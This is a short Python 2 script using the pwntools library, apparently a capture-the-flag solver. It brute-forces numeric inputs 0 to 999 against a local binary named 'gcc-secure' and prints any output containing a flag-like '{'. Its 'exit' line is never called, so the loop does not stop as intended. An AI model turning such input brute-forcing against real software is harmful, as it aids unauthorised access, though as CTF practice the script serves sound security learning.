from pwn import *
import os
import time
e = ELF('./gcc-secure')
for i in range(1000):
    s = process(argv=[e.path,'secret.c'])
    s.sendline(str(i))
    data = s.recv()
    time.sleep(0.1)
    log.info(i)
    if os.environ.has_key('debug'):
        log.info(data)
    if "{" in data:
        print data
        exit
